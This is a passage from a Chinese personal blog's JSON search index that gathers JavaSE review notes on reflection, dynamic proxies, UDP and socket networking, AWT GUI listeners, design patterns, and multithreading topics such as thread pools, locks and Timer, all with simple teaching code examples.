\"李四\"); System.out.println(p); 例子4（通过反射写一个通用的工具类，来设置某个对象的 某个属性为指定的值）：12345678910111213//此方法可将obj对象中名为propertyName的属性的值设置为value。public void setProperty(Object obj, String propertyName, Object value) throws Exception &#123; Class clazz = obj.getClass(); //获取字节码对象 Field f = clazz.getDeclaredField(propertyName); //暴力反射获取字段 f.setAccessible(true); //去除权限 f.set(obj, value);&#125; 反射之——动态代理12345678910111213141516171819202122232425262728//创建一个代理类，它其实就是一个代理工厂public class MyInvocationHandler implements InvocationHandler &#123; private Object target; public MyInvocationHandler(Object target) &#123; this.target = target; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(\"权限校验\"); method.invoke(target, args); //执行被代理target对象的方法 System.out.println(\"日志记录\"); return null; &#125;&#125;//让代理工厂代理这个类StudentImp si = new StudentImp();MyInvocationHandler m = new MyInvocationHandler(si);Student s = (Student)Proxy.newProxyInstance(si.getClass().getClassLoader(), si.getClass().getInterfaces(), m);s.login();s.submit(); 底层原理（虽然底层不需要我们管，这个jdk自己会解决，但是理解这个原理对我们也有好处）： 原理当我们调用Proxy.newProxyInstance类时，会通过反射创建一个代理类的字节码并且返回它的实例，它实现了StudentImp实现的接口，并且继承Proxy，它的构造类传入了我们创建的实现了InvocationHandler接口的对象，并且在static静态初始化中把StudentImp实现的接口的各个方法的Method方法都初始化完成（其中包括equals、toString等方法），因为它实现了StudentImp实现的接口，并且重写的方法是直接调用我们传入的实现了InvocationHandler接口的对象中的invoke方法，所以我们调用案例中的login和submit方法可以实现动态代理","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"动态代理","slug":"动态代理","permalink":"http://liuhaoan.github.io/tags/动态代理/"},{"name":"反射","slug":"反射","permalink":"http://liuhaoan.github.io/tags/反射/"},{"name":"动态代理底层原理","slug":"动态代理底层原理","permalink":"http://liuhaoan.github.io/tags/动态代理底层原理/"}]},{"title":"javaSE复习之——网络编程_UDP传输","slug":"javaSE复习之——网络编程-UDP传输","date":"2019-04-11T01:26:46.000Z","updated":"2019-04-11T01:29:41.326Z","comments":true,"path":"2019/04/11/javaSE复习之——网络编程-UDP传输/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——网络编程-UDP传输/","excerpt":"UDP概念 UDP协议相对于TCP协议，它是不保证数据安全的，但是它的传输速度相对更快，它不需要客户端服务端进行连接。 ps：服务端必须指定端口号，发送端可以随机端口号，但是Packet数据报对象必须指定服务端的端口号","text":"UDP概念 UDP协议相对于TCP协议，它是不保证数据安全的，但是它的传输速度相对更快，它不需要客户端服务端进行连接。 ps：服务端必须指定端口号，发送端可以随机端口号，但是Packet数据报对象必须指定服务端的端口号 创建一个服务端123456789101112131415161718192021DatagramSocket socket = new DatagramSocket(6666);//创建Socket相当于创建码头DatagramPacket packet = new DatagramPacket(new byte[1024], 1024);//创建Packet数据报包相当于创建集装箱socket.receive(packet);//接收数据相当于接货byte[] arr = packet.getData();//获取数据缓冲区int len = packet.getLength();//获取有效的字节个String ip = packet.getAddress().getHostAddress();//获取ip地址int port = packet.getPort();//获取端口号System.out.println(ip + \":\" + port + \":\" + new String(arr,0,len)); 创建一个客户端：123456789101112131415161718Scanner sc = new Scanner(System.in);DatagramSocket socket = new DatagramSocket();//创建Socket相当于创建码头String line = sc.nextLine();//获取键盘录入的字符串if(\"quit\".equals(line)) &#123; break;&#125;//创建Packet相当于集装箱DatagramPacket packet = new DatagramPacket(line.getBytes(), line.getBytes().length, InetAddress.getByName(\"127.0.0.1\"), 6666);socket.send(packet);//发货,将数据发出去socket.close();//关闭码头","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://liuhaoan.github.io/tags/网络编程/"},{"name":"UDP传输","slug":"UDP传输","permalink":"http://liuhaoan.github.io/tags/UDP传输/"}]},{"title":"javaSE复习之——网络编程_Socket概述","slug":"javaSE复习之——网络编程-Socket概述","date":"2019-04-11T01:23:15.000Z","updated":"2019-04-11T01:26:16.674Z","comments":true,"path":"2019/04/11/javaSE复习之——网络编程-Socket概述/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——网络编程-Socket概述/","excerpt":"Socket套接字概述","text":"Socket套接字概述 网络上具有唯一标识的IP地址和端口号组合在一起才能构成唯一能识别的标识符套接字。（ip地址和端口一起构成一个能识别的标识符套接字） 通信的两端都有Socket。 网络通信其实就是Socket间的通信。 数据在两个Socket间通过IO流传输。 Socket在应用程序中创建，通过一种绑定机制与驱动程序建立关系，告诉自己所对应的IP和port。 ps：也就是通信的两端都会创建一个Sockt套接字，然后俩个Scoket套接字进行通信。可以理解为一个航运的过程，Socket就是码头，来往的船只就是数据，海峡两岸的互相来往其实就是码头与码头的互相来往。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[]},{"title":"javaSE复习之——网络编程_网络三要素","slug":"javaSE复习之——网络编程-网络三要素","date":"2019-04-11T01:20:16.000Z","updated":"2019-04-11T01:22:41.529Z","comments":true,"path":"2019/04/11/javaSE复习之——网络编程-网络三要素/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——网络编程-网络三要素/","excerpt":"IP概述 它是每一个设备在网络中的唯一标识，每一台终端在网络中都有一个独立的地址，我们在网络传输中传输数据就是使用这个地址","text":"IP概述 它是每一个设备在网络中的唯一标识，每一台终端在网络中都有一个独立的地址，我们在网络传输中传输数据就是使用这个地址 本地回路地址：127.0.0.1 255.255.255.255是广播地址 IPv4：4个字节组成，4个0-255。大概42亿，30亿都在北美，亚洲4亿。2011年初已经用尽。 IPv6：8组，每组4个16进制数。 1a2b:0000:aaaa:0000:0000:0000:aabb:1f2f 1a2b::aaaa:0000:0000:0000:aabb:1f2f 1a2b:0000:aaaa::aabb:1f2f 1a2b:0000:aaaa::0000:aabb:1f2f 1a2b:0000:aaaa:0000::aabb:1f2f 端口概述 每个程序在设备上的唯一标识 每个网络程序都需要绑定一个端口号，传输数据的时候除了确定发到哪台机器上，还要明确发到哪个程序。 端口号范围从0-65535 编写网络应用就需要绑定一个端口号，尽量使用1024以上的，1024以下的基本上都被系统程序占用了。 常用端口 mysql: 3306 oracle: 1521 web: 80 tomcat: 8080 QQ: 4000 feiQ: 2425 协议概述 为计算机网络中进行数据交换而建立的规则、标准或约定的集合。 UDP 面向无连接，数据不安全，速度快。不区分客户端与服务端。 TCP * 面向连接（三次握手），数据安全，速度略低。分为客户端和服务端。 三次握手: 客户端先向服务端发起请求, 服务端响应请求, 传输数据","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"网络编程","slug":"网络编程","permalink":"http://liuhaoan.github.io/tags/网络编程/"},{"name":"网络三要素","slug":"网络三要素","permalink":"http://liuhaoan.github.io/tags/网络三要素/"}]},{"title":"javaSE复习之——GUI","slug":"javaSE复习之——GUI","date":"2019-04-10T10:51:03.000Z","updated":"2019-04-10T11:08:43.698Z","comments":true,"path":"2019/04/10/javaSE复习之——GUI/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——GUI/","excerpt":"Gui的概述 它是一个图形用户接口 GUI的类 Frame 创建一个窗口1Frame f = new Frame(); ps：刚创建时不可见的","text":"Gui的概述 它是一个图形用户接口 GUI的类 Frame 创建一个窗口1Frame f = new Frame(); ps：刚创建时不可见的 Frame的方法： .setVisible() 设置窗口是否可见 .setSize(100,200) 设置窗体大小 .setLocation(500. 50) 设置窗体位置 .setIconImage(Toolkit.getDefaultToolKit().createImage(“1.png”)) 设置窗体图标 .setLayout(new FlowLayout()); 设置布局管理器 添加一个按钮：1234Button b1 = new Button(\"按钮一\");Button b2 = new Button(\"按钮二\");f.add(b1); //向组件添加指定的弹出菜单f.add(b2); GUI布局管理器 FlowLayout（流式布局管理器） 从左到右的顺序排列。Panel默认的布局管理器。 BorderLayout（边界布局管理器） 东，南，西，北，中Frame默认的布局管理器。 GridLayout（网格布局管理器） 规则的矩阵 CardLayout（卡片布局管理器） 选项卡 GridBagLayout（网格包布局管理器） 非规则的矩阵 布局管理器类的一些常用方法 .setEditable(booleam) 设置这个布局是否可编辑 .setBackground(Color.WHITE) 设置背景颜色 .setFont() 设置字体 布局管理器常用类： Panel 是最简单的容器类。应用程序可以将其他组件放在面板提供的空间内，这些组件包括其他面板。 TextField 单行文本框 TextArea 多行文本框 GUI窗体监听概述 用于接收窗口事件的侦听器接口，当通过打开、关闭、激活或停用、图标化或取消图标化而改变了窗口状态时，将调用该侦听器对象中的相关方法。 窗体监听接口 WindowListener 窗口监听方法一 使用创建类实现WindowListener接口并且重写方法实现，需要重写多个对象，并且还必须创建类，所以麻烦不推荐 1、创建一个类实现WindowListener接口 2、把WindowListener接口中每一个方法都重写 3、创建那个类的对象，然后调用f.addWindowListener方法传入这个对象。 窗口监听方法二（直接传入一个匿名内部类） ps WindowAdapter适配器实现并重写了WindowListener接口，我们只要继承它重写方法就可以只重写一个方法了。 代码示例 12345678910Frame f = new Frame(\"我的窗体\");//事件源是窗体,把监听器注册到事件源上//事件对象传递给监听器f.addWindowListener(new WindowAdapter() &#123; public void windowClosing(WindowEvent e) &#123; //退出虚拟机,关闭窗口 System.exit(0); &#125;&#125;); GUI鼠标监听 添加一个鼠标监听 b1.addMouseListener（） 鼠标监听接口 MouseListener 与窗体监听同理，他有一个适配器 MouseAdapter ps：创建鼠标监听与窗体监听同理，具体看api GUI键盘监听和键盘事件 添加一个键盘监听 b1.addKeyListener（） 键盘监听接口 KeyListener 与窗体监听同理，他有一个适配器 KeyAdapter ps：创建键盘监听与窗体监听同理，具体看api ps：单独添加一个键盘监听的话，只要键盘按下任何键，程序都会执行重写方法中的代码 KeyEvent类 当我们按下某键时，会给监听器传入一个KeyEvent类，它是用户按下的某键 代码示例 1234567891011b1.addKeyListener(new KeyAdapter() &#123; @Override public void keyReleased(KeyEvent e) &#123; //System.exit(0); //System.out.println(e.getKeyCode()); //获取用户输入的按键代码 //if(e.getKeyCode() == 32) &#123; if(e.getKeyCode() == KeyEvent.VK_SPACE)&#123; //KeyEvent.VK_SPACE为空格，它是个常量 System.exit(0); &#125; &#125;&#125;); GUI动作监听 添加一个键盘监听 b2.addActionListener（） 键盘监听接口 ActionListener ps：因为这个接口只有一个方法，所以没有适配器，适配器只是为了在多方法接口中只重写一个方法 ps：创建键盘监听与窗体监听同理，具体看api 应用场景 暂停视频和播放视频","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"GUI","slug":"GUI","permalink":"http://liuhaoan.github.io/tags/GUI/"},{"name":"GUI布局管理器","slug":"GUI布局管理器","permalink":"http://liuhaoan.github.io/tags/GUI布局管理器/"},{"name":"GUI窗体监听","slug":"GUI窗体监听","permalink":"http://liuhaoan.github.io/tags/GUI窗体监听/"},{"name":"GUI鼠标监听","slug":"GUI鼠标监听","permalink":"http://liuhaoan.github.io/tags/GUI鼠标监听/"},{"name":"GUI键盘监听","slug":"GUI键盘监听","permalink":"http://liuhaoan.github.io/tags/GUI键盘监听/"},{"name":"GUI键盘事件","slug":"GUI键盘事件","permalink":"http://liuhaoan.github.io/tags/GUI键盘事件/"},{"name":"GUI动作监听","slug":"GUI动作监听","permalink":"http://liuhaoan.github.io/tags/GUI动作监听/"}]},{"title":"javaSE复习之——设计模式_简单工厂与工厂方法模式","slug":"javaSE复习之——设计模式-简单工厂与工厂方法模式","date":"2019-04-10T09:43:52.000Z","updated":"2019-04-10T09:48:15.524Z","comments":true,"path":"2019/04/10/javaSE复习之——设计模式-简单工厂与工厂方法模式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-简单工厂与工厂方法模式/","excerpt":"简单工厂模式概述 它又叫静态工厂方法模式，它定义一个具体的工厂类覅则创建一些类的实列 优点 客户端不需要在负责对象的创建，从而明确了各个类的职责 缺点 这个静态工厂类负责所有对象的创建，如果有新的对象添加，或者某些对象创建方式不同，就需要不断修改工厂，不利于后期维护","text":"简单工厂模式概述 它又叫静态工厂方法模式，它定义一个具体的工厂类覅则创建一些类的实列 优点 客户端不需要在负责对象的创建，从而明确了各个类的职责 缺点 这个静态工厂类负责所有对象的创建，如果有新的对象添加，或者某些对象创建方式不同，就需要不断修改工厂，不利于后期维护 工厂方法模式概述 工厂方法模式中，抽象工厂类类负责定义创建对象的接口，具体对象的创建工作由继承抽象工厂的具体类实现 优点 客户端不需要再负责对象的创建，从而明确了各个类的职责，如果由新的对象增加，只需要增加一个具体的类和工厂即可，不影响已有的代码，增强了系统的维护性 缺点 需要额外写代码，增加了工作量 代码示例12345DogFactory df = new DogFactory();//DogFactory是实现工厂接口的工厂类Dog d = (Dog) df.createAnimal();//调用工厂类重写的抽象方法中的createAnimal类来创建对象d.eat(); 示例继承体系 Factory工厂接口 定义抽象方法createAnimal() DogFactory重写方法createAnimal()，创建dog对象 CatFactory重写方法createAnimal(),创建cat对象 Animal dog cat","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://liuhaoan.github.io/tags/设计模式/"},{"name":"简单工厂模式","slug":"简单工厂模式","permalink":"http://liuhaoan.github.io/tags/简单工厂模式/"},{"name":"工厂方法模式","slug":"工厂方法模式","permalink":"http://liuhaoan.github.io/tags/工厂方法模式/"}]},{"title":"javaSE复习之——多线程_线程池","slug":"javaSE复习之——多线程-线程池","date":"2019-04-10T09:38:29.000Z","updated":"2019-04-10T09:41:09.224Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-线程池/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程池/","excerpt":"线程池的概述 一个形象的比喻： 把很多线程全部养在一个池子里，要用就拿出来用，不用就放回去，还不会死掉的。这样就不用一直创建-死亡，因为线程的创建-死亡需要与计算机系统交互，这样的成本是很高的，用上线程池就可以很好的提高性能，尤其是程序中有很多生存周期短的线程。在jdk5之前必须手动创建线程池，jdk5之后java内置线程池","text":"线程池的概述 一个形象的比喻： 把很多线程全部养在一个池子里，要用就拿出来用，不用就放回去，还不会死掉的。这样就不用一直创建-死亡，因为线程的创建-死亡需要与计算机系统交互，这样的成本是很高的，用上线程池就可以很好的提高性能，尤其是程序中有很多生存周期短的线程。在jdk5之前必须手动创建线程池，jdk5之后java内置线程池 jdk5新增了一个Executors工厂类来生产线程池，有如下几个方法： .newFixedTreadPool(int) 创建一个线程池int传多少就是可以放多少线程 .newSingleTreadExecutor() 创建一个可以放一条线程的线程池 线程池对象 ExecutorService ExecutorService线程池对象中的方法： .submit(线程对象) 把线程放入线程池中，并且执行 .shutdown() 关闭线程池 创建线程池示例1ExecutorService es = Executors.newFixedTreadPool(12)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"线程池","slug":"线程池","permalink":"http://liuhaoan.github.io/tags/线程池/"},{"name":"JDK5新特性Executors工厂类","slug":"JDK5新特性Executors工厂类","permalink":"http://liuhaoan.github.io/tags/JDK5新特性Executors工厂类/"}]},{"title":"javaSE复习之——多线程_线程的5种状态","slug":"javaSE复习之——多线程-线程的5种状态","date":"2019-04-10T09:35:32.000Z","updated":"2019-04-10T09:37:31.773Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-线程的5种状态/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程的5种状态/","excerpt":"","text":"ps：面试的时候可能会问1、新建，创建线程对象 2、就绪状态（执行了start开始命令，让他有了执行资格，但是因为cpu的机制没有执行权） 3、运行状态（抢到了cpu执行权） 4、阻塞状态（当运行时遇到了sleep或者wait进入睡眠，当睡眠结束又进入就绪状态） 5、死亡（线程执行完毕，线程对象变成了垃圾）","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"线程的5种状态面试题","slug":"线程的5种状态面试题","permalink":"http://liuhaoan.github.io/tags/线程的5种状态面试题/"}]},{"title":"javaSE复习之——多线程_线程组","slug":"javaSE复习之——多线程-线程组","date":"2019-04-10T09:33:09.000Z","updated":"2019-04-10T09:35:09.464Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-线程组/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-线程组/","excerpt":"线程组的概述 它可以对一批线程进行分类管理，java允许程序直接对线程组进行控制 线程组的类 ThreadGroup","text":"线程组的概述 它可以对一批线程进行分类管理，java允许程序直接对线程组进行控制 线程组的类 ThreadGroup 线程组类中的方法 .getName() 通过线程组对象获取他组的名字，返回String，默认所属组为main主线程 创建一个线程组12ThreadGroup tg = new ThreadGroup(\"线程组名称\");//不传入线程组名称则默认线程组为main主线程 创建一个线程并且放在某个组内1Thread t = new Thread(创建好的线程组，要创建线程的对象，线程名(可不填)); 线程组的作用举例 当我们执行 tg.setDaemon(true) 设置成守护线程时，线程组内所有线程都被设置成了守护线程","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"线程组","slug":"线程组","permalink":"http://liuhaoan.github.io/tags/线程组/"}]},{"title":"javaSE复习之——多线程_JDK5新特性互斥锁","slug":"javaSE复习之——多线程-JDK5新特性互斥锁","date":"2019-04-10T09:27:57.000Z","updated":"2019-04-10T09:32:15.525Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-JDK5新特性互斥锁/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-JDK5新特性互斥锁/","excerpt":"概述 它是锁（synchronized）的封装类，它更加的强大 互斥锁类 reentrantLock","text":"概述 它是锁（synchronized）的封装类，它更加的强大 互斥锁类 reentrantLock 监视器类 Condition（封装了一下Object中的监视器方法） 互斥锁方法 .lock() 获得一个锁 .unlock() 释放此锁 .newCondition() 获取一个Condition监视器对象，用来进行线程通信 通过互斥锁线程通信示例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class Printer3 &#123; private ReentrantLock r = new ReentrantLock(); private Condition c1 = r.newCondition(); private Condition c2 = r.newCondition(); private Condition c3 = r.newCondition(); private int flag = 1; public void print1() throws InterruptedException &#123; r.lock(); //获取锁 if(flag != 1) &#123; c1.await(); &#125; System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"！\"); System.out.print(\"\\r\\n\"); flag = 2; //this.notify(); //随机唤醒单个等待的线程 c2.signal(); r.unlock(); //释放锁 &#125; public void print2() throws InterruptedException &#123; r.lock(); if(flag != 2) &#123; c2.await(); &#125; System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"\\r\\n\"); flag = 3; //this.notify(); c3.signal(); r.unlock(); &#125; public void print3() throws InterruptedException &#123; r.lock(); if(flag != 3) &#123; c3.await(); &#125; System.out.print(\"a\"); System.out.print(\"b\"); System.out.print(\"c\"); System.out.print(\"d\"); System.out.print(\"e\"); System.out.print(\"f\"); System.out.print(\"g\"); System.out.print(\"\\r\\n\"); flag = 1; c1.signal(); r.unlock(); &#125;&#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"JDK5新特性","slug":"JDK5新特性","permalink":"http://liuhaoan.github.io/tags/JDK5新特性/"},{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"互斥锁","slug":"互斥锁","permalink":"http://liuhaoan.github.io/tags/互斥锁/"}]},{"title":"javaSE复习之——多线程_两线程通信","slug":"javaSE复习之——多线程-两线程通信","date":"2019-04-10T09:24:13.000Z","updated":"2019-04-10T09:31:07.830Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-两线程通信/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-两线程通信/","excerpt":"什么时候需要通信 多线程并发时，在默认情况下CPU时随机切换线程执行的，如果我们希望他们又规律的执行，就可以使用通信，例如每个线程执行一次打印","text":"什么时候需要通信 多线程并发时，在默认情况下CPU时随机切换线程执行的，如果我们希望他们又规律的执行，就可以使用通信，例如每个线程执行一次打印 Object中方法： .wait() 让本线程等待（暂停运行） .notify() 让一条线程停止等待，当有多条线程等待是随机停止等待一条 .notifyAll() 让所有等待线程停止等等待 为什么wait方法和notify方法定义在object中？ 答： 因为锁对象可以是任意对象，而Object是所有类的基类，所以他们两个定义在Object中 sleep方法和wait方法的区别是什么（面试题）？ 1、sleep方法必须传入参数时间到了自动醒来 2、wait方法可以传入参数也可以不传入参数，传入参数就是在参数时间后等待，不传入则立马开始等待 3、sleep在同步代码块或者同步函数中，不会释放锁（cpu会一直在这个方法或者代码块中等待） 4、wait在同步函数或者同步代码块中，会释放锁（让cpu可以去执行其他线程） 线程之间通信注意事项： 带同步代码块中，用哪个对象锁，就用哪个对象调用wait方法等待 线程通信例子（jdk1.5版本之前解决方案）123456789101112131415161718192021222324252627282930313233343536//等待唤醒机制class Printer &#123; private int flag = 1; public void print1() throws InterruptedException &#123; synchronized(this) &#123; if(flag != 1) &#123; this.wait(); //当前线程等待 &#125; System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"！\"); System.out.print(\"\\r\\n\"); flag = 2; this.notify(); //随机唤醒单个等待的线程 &#125; &#125; public void print2() throws InterruptedException &#123; synchronized(this) &#123; if(flag != 2) &#123; this.wait(); &#125; System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"加\"); System.out.print(\"油\"); System.out.print(\"\\r\\n\"); flag = 1; this.notify(); &#125; &#125;&#125; ps：两个以以上线程进行通信增加flag值修改即可，不过必须是使用notifyAll，并且判断语句需要使用while不能使用if","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"两线程通信","slug":"两线程通信","permalink":"http://liuhaoan.github.io/tags/两线程通信/"},{"name":"sleep方法和wait方法的区别是什么（面试题）","slug":"sleep方法和wait方法的区别是什么（面试题）","permalink":"http://liuhaoan.github.io/tags/sleep方法和wait方法的区别是什么（面试题）/"}]},{"title":"javaSE复习之——多线程_Timer类","slug":"javaSE复习之——多线程-Timer类","date":"2019-04-10T09:22:31.000Z","updated":"2019-04-10T09:23:51.998Z","comments":true,"path":"2019/04/10/javaSE复习之——多线程-Timer类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——多线程-Timer类/","excerpt":"Timer的概述 它其实就是一个计时器，线程可以用它安排以后在后台执行的任务，可以安排执行一次，或者定期重复执行，可以把它想象成一个闹钟。","text":"Timer的概述 它其实就是一个计时器，线程可以用它安排以后在后台执行的任务，可以安排执行一次，或者定期重复执行，可以把它想象成一个闹钟。 使用方法 创建一个定时任务类，继承TimerTask类，然后在主方法创建Timer对象并且传入任务类对象和要执行的时间，如果需要第一次执行之后果断时间继续重复执行，那么就在第三个参数传入一个等待时间 使用方法案例123456789101112131415public class Test13_Timer &#123; public static void main(String[] args) &#123; Timer t = new Timer(); Calendar c = Calendar.getInstance(); c.set(Calendar.MINUTE, 56); t.schedule(new tesk(), c.getTime()); &#125;&#125;class tesk extends TimerTask &#123; @Override public void run() &#123; System.out.println(\"定时任务11111\"); &#125;&#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"http://liuhaoan.github.io/tags/多线程/"},{"name":"Timer类","slug":"Timer类","permalink":"http://liuhaoan.github.io/tags/Timer类/"}]},{"title":"javaSE复习之——设计模式_单列设计模式","slug":"javaSE复习之——设计模式-单列设计模式","date":"2019-04-10T09:12:55.000Z","updated":"2019-04-10T09:21:39.377Z","comments":true,"path":"2019/04/10/javaSE复习之——设计模式-单列设计模式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——设计模式-单列设计模式/","excerpt":"概述 单列设计模式就是保证某个类只能被创建一个对象 如何保证这个类在内存中只有一个对象呢？ 1、私有化它的构造方法，不让别的类访问这个类 2、在这个类中定义一个本类的对象，并且将它私有化、静态化、并且用最终修饰符修饰。 3、创建一个静态的get方法返回对这个对象的引用","text":"概述 单列设计模式就是保证某个类只能被创建一个对象 如何保证这个类在内存中只有一个对象呢？ 1、私有化它的构造方法，不让别的类访问这个类 2、在这个类中定义一个本类的对象，并且将它私有化、静态化、并且用最终修饰符修饰。 3、创建一个静态的get方法返回对这个对象的引用 代码示例1（饿汉式）12345678910class Singleton &#123; //1、私有构造方法不让别人访问 private Singleton() &#123;&#125; //2、创建本类对象让别人访问 private static final Singleton s = new Singleton(); //3、创建个体方法 public static Singleton getInstance() &#123; return s; &#125;&#125; 为什么叫饿汉式？ 因为类一加载就要创建对象，比喻一个饿汉一上来就要吃，吃的东西也就是new的这个对象。 ps：其实get方法都可以不需要创建，因为引用对象的成员变量是用final修饰的，直接调用即可，当然这样就不是饿汉式了，而是第三种格式。 代码示例2（懒汉式）12345678910111213class Singleton &#123; //1、私有构造方法不让别人访问 private Singleton() &#123;&#125; //2、创建声明引用 private static Singleton s ; //3、创建个体方法 public static Singleton getInstance() &#123; if(s == null) &#123; s = new Singleton(); &#125; return s; &#125;&#125; ps：因为它比较懒，要用到的时候才去创建，所以叫懒汉式，但是平时开发不用懒汉式，而用饿汉式。 为什么平时用饿汉式？ 答： 因为虽然懒汉式不会浪费空间内存，但是他会有线程安全问题 举个例子：当我线程1和线程2要获取这个类，当cpu执行的线程1刚好判断进去创建对象的时候，突然cpu又去执行线程2了，当cpu执行完线程2的时候已经创建好了一个对象，这时cpu又回来执行线程1，那么就创建了两个对象，所以它会又线程安全问题。 那懒汉式什么时候用？ 答： 面试的时候！面试的时候会出一个“请写出一个单例的延迟加载模式”，那么这个时候其实就是让我们写懒汉模式。 两种单例模式实现的区别 1、饿汉式它是空间换时间 解析：因为一上来就直接创建对象，要用的时候直接调用，所以要用的时候速度相对更快 2、懒汉式它是时间换空间 解析：因为一上来它不创建对象，而要用的时候先判断再创对象，而且以后每次需要用都要判断，所以浪费了时间 3、在多线程访问时，饿汉式绝对不会创建多个对象，而懒汉式就会存在线程安全问题，会创建多个对象 Runtime类概述： 每个java程序都有一个Runtime类，它与运行环境相连接，它就是是使用的单例设计模式。 Runtime是的应用场景 当我们需要执行cmd之类的命令的时候就可以勇担Runtime中的exec方法","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://liuhaoan.github.io/tags/设计模式/"},{"name":"单列设计模式","slug":"单列设计模式","permalink":"http://liuhaoan.github.io/tags/单列设计模式/"},{"name":"延迟加载模式面试题","slug":"延迟加载模式面试题","permalink":"http://liuhaoan.github.io/tags/延迟加载模式面试题/"},{"name":"Runtime类","slug":"Runtime类","permalink":"http://liuhaoan.github.io/tags/Runtime类/"}]},{"title":"javaSE复习之——线程","slug":"javaSE复习之——线程","date":"2019-04-10T09:00:06.000Z","updated":"2019-04-10T09:43:04.563Z","comments":true,"path":"2019/04/10/javaSE复习之——线程/","link":"","permalink":"http://liuhaoan.github.io/2019/04/10/javaSE复习之——线程/","excerpt":"线程概述 线程其实就是程序执行的一条路径，一个进程中可以包含多条线程，多线程并发执行可以提高程序效率，可以同使完成多项任务","text":"线程概述 线程其实就是程序执行的一条路径，一个进程中可以包含多条线程，多线程并发执行可以提高程序效率，可以同使完成多项任务 多线程的应用场景 迅雷多线程一起下载 服务器同时处理多个客户请求 多线程原理(单核CPU) 在电脑上运行多个程序时，其实cpu一次只能做一个事，做一段时间后然后换另一个另一个做一段时间，只是cpu的速度太快了，看起来就是同时做很多事，也就是说多线程其实只是表面上的多线程，底层cpu还是一次只能做一个事，但是这有个前提，那就是那个cpu是单核cpu，如果事多核cpu，那么就可以真正的达到并行。 多线程并行和并发的区别 并行 并行是两个任务同时运行，需要多核cpu，有多少核就可以并行多少任务。 并发 并发是两个任务都请求运行，而一个处理器只能接受一个任务，就安排两个任务轮流进行，由于时间比较段短就感觉两个任务是同时在运行 ps 我们所谓的多线程就是并发，如果不使用多线程，那么程序就是一句一句代码请求，如果使用了多线程，那么就可以这个方法请求运行，同时另一个方法也请求运行，也就是说，没有使用多线程的话代码是一条一条请求，使用了就是多条同时请求，但底层并不是并行，只是cpu处理太快了感觉不到。 多线程程序实现方法1 1、定义类继承Thread 2、重写run方法 3、把新线程要做的事写在run方法中 4、创建线程对象，也就是我们定义的这个对象 5、开启新的线程（start），内部会自动执行run方法 多线程程序实现方法2 1、定义类实现Runnable接口 2、重写run方法 3、把新线程要做的事卸载run方法中 